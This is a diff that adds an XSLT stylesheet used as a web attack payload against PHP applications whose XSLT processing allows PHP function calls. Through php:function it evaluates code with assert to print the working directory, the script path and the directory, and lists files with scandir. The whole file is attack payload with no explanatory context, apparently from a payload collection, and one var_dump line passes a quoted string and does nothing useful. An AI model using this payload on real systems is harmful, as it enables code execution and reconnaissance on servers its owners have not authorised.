@@ -1,0 +1,11 @@
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
+<xsl:template match="/">
+<xsl:value-of select="php:function('var_dump','scandir(__DIR__)')"/>
+<xsl:value-of select="php:function('assert','getcwd()')"/>
+<xsl:value-of select="php:function('assert','echo __FILE__')"/>
+<xsl:value-of select="php:function('assert','echo __DIR__')"/>
+
+ <xsl:value-of select="php:function('implode',',',scandir(__DIR__))"/>
+
+</xsl:template>
+</xsl:stylesheet>
